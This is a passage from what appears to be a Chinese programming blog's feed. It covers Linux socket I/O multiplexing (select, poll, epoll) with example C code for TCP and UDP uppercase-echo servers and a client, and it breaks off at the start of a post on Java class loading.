title="使用select实现多路IO转接"></a>使用select实现多路IO转接</h5><p><code>server</code>端代码如下</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"wrap.h"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SRV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> listenfd,connfd;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">srv_addr</span>,<span class="title">clt_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clt_addr_len;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">int</span> opt = <span class="number">1</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;srv_addr,<span class="number">0</span>,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line">srv_addr.sin_family = AF_INET;</span><br><span class="line">srv_addr.sin_port = htons(SRV_PORT);</span><br><span class="line">srv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line"></span><br><span class="line">listenfd = Socket(AF_INET,SOCK_STREAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">Bind(listenfd,(struct sockaddr *)&amp;srv_addr,<span class="keyword">sizeof</span>(srv_addr));</span><br><span class="line"></span><br><span class="line">Listen(listenfd,<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">fd_set rset,allset; <span class="comment">//定义 读集合，备份集合allset</span></span><br><span class="line">FD_ZERO(&amp;allset);  <span class="comment">//清空监听集合</span></span><br><span class="line">FD_SET(listenfd,&amp;allset); <span class="comment">//将待监听fd添加到监听集合中</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> ret,maxfd = <span class="number">0</span>,i,n,j;</span><br><span class="line">maxfd = listenfd; <span class="comment">//最大文件描述符</span></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">rset = allset;  <span class="comment">//备份</span></span><br><span class="line">ret = select(maxfd+<span class="number">1</span>,&amp;rset,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>); <span class="comment">//使用select监听</span></span><br><span class="line"><span class="keyword">if</span>(ret &lt; <span class="number">0</span>)</span><br><span class="line">perr_err(<span class="string">"select error"</span>);</span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(listenfd,&amp;rset))&#123; <span class="comment">//listenfd满足监听的读事件</span></span><br><span class="line">clt_addr_len = <span class="keyword">sizeof</span>(clt_addr);</span><br><span class="line">connfd = Accept(listenfd,(struct sockaddr*)&amp;clt_addr,&amp;clt_addr_len);</span><br><span class="line">FD_SET(connfd,&amp;allset); <span class="comment">//将新产生的fd添加到监听集合中，监听数据读事件</span></span><br><span class="line"><span class="keyword">if</span>(maxfd &lt; connfd) <span class="comment">//修改maxfd</span></span><br><span class="line">maxfd = connfd;</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">1</span>) <span class="comment">//说明select只返回一个，并且是listenfd，后续指令无需执行</span></span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(i=listenfd+<span class="number">1</span>;i&lt;=maxfd;i++)&#123; <span class="comment">//处理满足读事件的fd</span></span><br><span class="line"><span class="keyword">if</span>(FD_ISSET(i,&amp;rset))&#123; <span class="comment">//找到满足读事件的那个fd</span></span><br><span class="line">n = read(i,buf,<span class="keyword">sizeof</span>(buf));</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">0</span>)&#123; <span class="comment">//检测到客户端已经关闭连接</span></span><br><span class="line">Close(i);</span><br><span class="line">FD_CLR(i,&amp;allset); <span class="comment">//将关闭的fd移除出监听集合</span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">-1</span>)&#123;</span><br><span class="line">perr_err(<span class="string">"read error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(j = <span class="number">0</span>;j&lt;n;j++)</span><br><span class="line">buf[j] = <span class="built_in">toupper</span>(buf[j]);</span><br><span class="line">write(i,buf,n);</span><br><span class="line">write(STDOUT_FILENO,buf,n);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Close(listenfd);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>自定义文件头<code>wrap.h</code>和封装函数<code>wrap.c</code>代码和之前的相同。</p><h5 id="poll"><a href="#poll" class="headerlink" title="poll"></a>poll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">poll</span><span class="params">(struct pollfd *fds, <span class="keyword">nfds_t</span> nfds,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line"><span class="function">  </span></span><br><span class="line">  fds: 监听的文件描述符数组</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span>&#123;</span></span><br><span class="line">      <span class="keyword">int</span> fd: 待监听的文件描述符</span><br><span class="line">      short events: 待监听的文件描述符对应的监听事件(POLLIN、POLLOUT、POLLERR)</span><br><span class="line">      short revents: 传入时，给<span class="number">0</span>。如果满足对应事件的话，返回非<span class="number">0</span>(POLLIN、POLLOUT、POLLERR)</span><br><span class="line">    &#125;</span><br><span class="line">  nfds: 监听数组的，实际有效监听个数</span><br><span class="line">  timeout: 超时时长</span><br><span class="line">    &gt;<span class="number">0</span>: 设置监听超时时长</span><br><span class="line">    <span class="number">-1</span>: 阻塞监听</span><br><span class="line">    <span class="number">0</span>: 非阻塞监听，轮询</span><br><span class="line">返回值</span><br><span class="line">    &gt;<span class="number">0</span> : 所有监听集合中，满足对应事件的总数</span><br><span class="line">    <span class="number">0</span> : 没有满足监听条件的文件描述符</span><br><span class="line">    <span class="number">-1</span> : errno</span><br></pre></td></tr></table></figure><p>read函数返回值</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="number">0</span>: 实际读到的字节数</span><br><span class="line">=<span class="number">0</span>: socket中，表示对端关闭。close()</span><br><span class="line"><span class="number">-1</span>: 如果errno == EINTR 被异常中断，需要重启</span><br><span class="line">  如果errno == EAGAIN或EWOULDBLOCK 以非阻塞方式读数据，但是没有数据。需要再次读</span><br><span class="line">  如果errno == ECONNRESET 说明连接被重置，需要close()。移除监听队列</span><br></pre></td></tr></table></figure><p>poll的优点：</p><ul><li><p>自带数组结构。可以将监听事件集合和返回事件集合分离</p></li><li><p>扩展 监听上限，超出1024限制</p></li></ul><p>缺点</p><ul><li>不能跨平台。只能在Linux下使用</li><li>无法直接定位满足监听事件的文件描述符，编码难度较大</li></ul><h5 id="epoll"><a href="#epoll" class="headerlink" title="epoll"></a>epoll</h5><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span></span><br><span class="line">  size: 创建的红黑树的监听节点数量(仅供内核参考)</span><br><span class="line">  返回值: 指向新创建的红黑树的根节点的fd。失败返回<span class="number">-1</span></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd,<span class="keyword">int</span> op,<span class="keyword">int</span> fd,struct epoll_event *event)</span></span></span><br><span class="line">  epfd: epoll_create函数的返回值 epfd</span><br><span class="line">  op: 对该监听红黑树所做的操作</span><br><span class="line">    EPOLL_CTL_ADD 添加fd到 监听红黑树</span><br><span class="line">    EPOLL_CTL_MOD 修改fd在 监听红黑树上的监听事件</span><br><span class="line">    EPOLL_CTL_DEL 将一个fd从 监听红黑树上摘下(取消监听)</span><br><span class="line">  fd: 待监听的fd</span><br><span class="line">  event: 本质 <span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> 结构体</span></span><br><span class="line"><span class="class">     <span class="title">events</span>:</span></span><br><span class="line">EPOLLIN、EPOLLOUT、EPOLLERR</span><br><span class="line"> data: 联合体</span><br><span class="line">           <span class="keyword">int</span> fd: 对应监听事件的fd</span><br><span class="line">           <span class="keyword">void</span> *ptr</span><br><span class="line">           <span class="keyword">uint32_t</span> u32 </span><br><span class="line">           <span class="keyword">uint64_t</span> u64</span><br><span class="line"> 返回值: 成功<span class="number">0</span> 失败返回<span class="number">-1</span> 设置errno</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd,struct epoll_event *events,<span class="keyword">int</span> maxevents,<span class="keyword">int</span> timeout)</span></span></span><br><span class="line">  epfd: epoll_create函数的返回值 epfd</span><br><span class="line">  events: 传出参数，数组，满足监听条件的fd结构体</span><br><span class="line">  maxevents: 数组元素的总个数</span><br><span class="line">  timeout: </span><br><span class="line">    &gt;<span class="number">0</span>: 设置监听超时时长(毫秒)</span><br><span class="line">    <span class="number">-1</span>: 阻塞监听</span><br><span class="line">    <span class="number">0</span>: 非阻塞监听，轮询</span><br><span class="line">  返回值:</span><br><span class="line">&gt;<span class="number">0</span>: 满足监听的总个数，可以用作循环上限</span><br><span class="line">     <span class="number">0</span>: 没有fd满足监听事件</span><br><span class="line">    <span class="number">-1</span>: 失败。errno</span><br></pre></td></tr></table></figure><h5 id="事件模型"><a href="#事件模型" class="headerlink" title="事件模型"></a>事件模型</h5><p>EPOLL事件有两种模型</p><ul><li><p>Edge Triggered(ET)：边缘触发只有数据到来才触发，不管缓存区中是否还有数据</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">epoll_event</span> <span class="title">event</span>;</span></span><br><span class="line">event.events = EPOLLIN | EPOLLET;</span><br></pre></td></tr></table></figure></li><li><p>Level Triggered(LT)：水平触发只要有数据都会触发</p></li></ul><h5 id="epoll反应堆模型"><a href="#epoll反应堆模型" class="headerlink" title="epoll反应堆模型"></a>epoll反应堆模型</h5><p>原来</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket、bind、listen -- epoll_create创建监听红黑树 -- 返回epfd -- epoll_ctl()向树上添加一个监听fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_wait监听 -- 对应监听fd有事件产生 -- 返回监听满足数组 -- 判断返回数组元素 -- lfd满足 -- Accept -- cfd满足 -- read() -- 小写转大写 -- write回去</span><br></pre></td></tr></table></figure><p>反应堆</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">socket、bind、listen -- epoll_create创建监听红黑树 -- 返回epfd -- epoll_ctl()向树上添加一个监听fd -- <span class="keyword">while</span>(<span class="number">1</span>) -- epoll_wait监听 -- 对应监听fd有事件产生 -- 返回监听满足数组 -- 判断返回数组元素 -- lfd满足 -- Accept -- cfd满足 -- read() -- 小写转大写 -- cfd从监听红黑树上摘下 -- EPOLLOUT -- 回调函数 -- epoll_ctl() -- PEOLL_CTL_ADD 重新放到红黑树上监听写事件 -- epoll_ctl() -- EPOLL_CTL_ADD 重新放到红黑树上监听读事件 -- epoll_wait监听</span><br></pre></td></tr></table></figure><h4 id="UDP并发服务器"><a href="#UDP并发服务器" class="headerlink" title="UDP并发服务器"></a>UDP并发服务器</h4><p><code>server</code>端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> lfd = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> ret;</span><br><span class="line"><span class="keyword">int</span> i;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="keyword">char</span> str[INET_ADDRSTRLEN];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">serv_addr</span>,<span class="title">clit_addr</span>;</span></span><br><span class="line"><span class="keyword">socklen_t</span> clit_addr_len;</span><br><span class="line">serv_addr.sin_family = AF_INET;</span><br><span class="line">serv_addr.sin_port = htons(SERV_PORT);</span><br><span class="line">serv_addr.sin_addr.s_addr = htonl(INADDR_ANY);</span><br><span class="line">lfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>); <span class="comment">//将tcp流式协议改为报式协议</span></span><br><span class="line"><span class="keyword">if</span>(lfd == <span class="number">-1</span>)&#123;</span><br><span class="line">sys_err(<span class="string">"socket error"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">bind(lfd,(struct sockaddr *)&amp;serv_addr,<span class="keyword">sizeof</span>(serv_addr));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Accepting connections ... \n"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">clit_addr_len = <span class="keyword">sizeof</span>(clit_addr);</span><br><span class="line">ret = recvfrom(lfd,buf,BUFSIZ,<span class="number">0</span>,(struct sockaddr *)&amp;clit_addr,&amp;clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"recvfrom eror"</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"received from %s at PORT %d\n"</span>,inet_ntop(AF_INET,&amp;clit_addr.sin_addr,str,<span class="keyword">sizeof</span>(str)),ntohs(clit_addr.sin_port));</span><br><span class="line"><span class="keyword">for</span> (i=<span class="number">0</span>;i&lt;ret;i++)</span><br><span class="line">buf[i] = <span class="built_in">toupper</span>(buf[i]);</span><br><span class="line">ret=sendto(lfd,buf,ret,<span class="number">0</span>,(struct sockaddr *)&amp;clit_addr,clit_addr_len);</span><br><span class="line"><span class="keyword">if</span>(ret == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sendto error"</span>);</span><br><span class="line">&#125;</span><br><span class="line">close(lfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>client</code>端</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;ctype.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SERV_PORT 9527</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">sys_err</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">perror(str);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">int</span> sockfd,n;</span><br><span class="line"><span class="keyword">char</span> buf[BUFSIZ];</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">servaddr</span>;</span></span><br><span class="line">sockfd = socket(AF_INET,SOCK_DGRAM,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">bzero(&amp;servaddr,<span class="keyword">sizeof</span>(servaddr));</span><br><span class="line">servaddr.sin_family = AF_INET;</span><br><span class="line">inet_pton(AF_INET,<span class="string">"127.0.0.1"</span>,&amp;servaddr.sin_addr);</span><br><span class="line">servaddr.sin_port = htons(SERV_PORT);</span><br><span class="line"><span class="comment">//bind(sockfd,(struct sockaddr *)&amp;servaddr,sizeof(servaddr));</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(fgets(buf,BUFSIZ,<span class="built_in">stdin</span>) != <span class="literal">NULL</span>)&#123;</span><br><span class="line">n = sendto(sockfd,buf,<span class="built_in">strlen</span>(buf),<span class="number">0</span>,(struct sockaddr *)&amp;servaddr,<span class="keyword">sizeof</span>(servaddr));</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"sendto error"</span>);</span><br><span class="line">n = recvfrom(sockfd,buf,BUFSIZ,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(n == <span class="number">-1</span>)</span><br><span class="line">sys_err(<span class="string">"recvfrom error"</span>);</span><br><span class="line">write(STDOUT_FILENO,buf,n);</span><br><span class="line">&#125;</span><br><span class="line">close(sockfd);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;Socket编程&quot;&gt;&lt;a href=&quot;#Socket编程&quot; class=&quot;headerlink&quot; title=&quot;Socket编程&quot;&gt;&lt;/a&gt;Socket编程&lt;/h4&gt;&lt;h5 id=&quot;套接字概念&quot;&gt;&lt;a href=&quot;#套接字概念&quot; class=&quot;headerlink
      
    
    </summary>
    
    
      <category term="Linux" scheme="elssm.github.io/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Java类加载</title>
    <link href="elssm.github.io/2021/10/30/Java%E7%B1%BB%E5%8A%A0%E8%BD%BD/"/>
    <id>elssm.github.io/2021/10/30/Java类加载/</id>
    <published>2021-10-30T14:47:18.000Z</published>
    <updated>2021-12-13T09:47:04.205Z</updated>
    
    <content type="html"><![CDATA[<h4 id="类的加载概述"><a href="#类的加载概述" class="headerlink" title="类的加载概述"></a>类的加载概述</h4><p>我们编写的<code>.java</code>扩展名的源代码文件存储着要执行的程序逻辑，这些文件需要经过<code>java</code>编译器编译成<code>.class</code>文件，<code>.class</code>文件中存放着编译后虚拟机指令的二进制信息。当需要用到某个类时，虚拟机将会加载它，并在内存中创建对应的<code>class</code>对象，这个过程称之为类的加载。一个类的生命周期从类被加载、连接和初始化开始，只有在虚拟机内存中，我们的<code>java</code>程序才可以使用它。</p><p><img src="/2021/10/30/Java类加载/1.png" alt="1"></p><h5 id="类的加载"><a href="#类的加载" class="headerlink" title="类的加载"></a>类的加载</h5><p>通过类的完全限定名(包名和类名)查找此类的字节码文件，把类的<code>.class</code>文件中的二进制数据读入到内存中，并存放在运行时数据区的方法区中，然后利用字节码文件创建一个<code>Class</code>对象，用来封装类在方法区内的数据结构并存放在堆区内，这个过程是由类加载器完成的。</p><h5 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h5><ul><li>验证：确保被加载类的正确性。<code>Class</code>文件的字节流中包含的信息符合当前虚拟机要求，不会危害虚拟机自身安全。</li><li>准备：为类的静态变量分配内存，并将其初始化为默认值，此阶段仅仅只为静态变量(即<code>static</code>修饰的字段变量)分配内存，并且设置该变量的初始值。对于<code>final static</code>修饰的变量，编译的时候就会分配了，也不会分配实例变量的内存。</li><li>解析：把类中的符号引用转换为直接引用，符号引用就是一组符号来描述目标，而直接引用就是直接指向目标的指针、相对偏移量或一个间接定位到目标的句柄。</li></ul><h5 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h5><p>类加载最后阶段，若该类具有父类，则先对父类进行初始化，执行静态变量赋值和静态代码块代码，成员变量也将被初始化。</p><h4 id="类加载器"><a href="#类加载器" class="headerlink" title="类加载器"></a>类加载器</h4><p>类的加载是由类加载器完成的，类加载器可以分为两种：第一种是Java虚拟机自带的类加载器，分别为启动类加载器、扩展类加载器和系统类加载器。第二种是用户自定义的类加载器，是<code>java.lang.ClassLoader</code>的子类实例。</p><h5 id="虚拟机内置类加载器"><a href="#虚拟机内置类加载器" class="headerlink" title="虚拟机内置类加载器"></a>虚拟机内置类加载器</h5><h6 id="根类加载器-Bootstrap"><a href="#根类加载器-Bootstrap" class="headerlink" title="根类加载器(Bootstrap)"></a>根类加载器(Bootstrap)</h6><p>根类加载器是最底层的类加载器，是虚拟机的一部分。它是由C++语言实现的，且没有父加载器，也没有继承<code>java.lang.ClassLoader</code>类。它主要负责加载由系统属性<code>sun.boot.class.path</code>指定的路径下的核心类库，出于安全考虑，根类加载器只加载<code>java、javax、sun</code>开头的类。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span 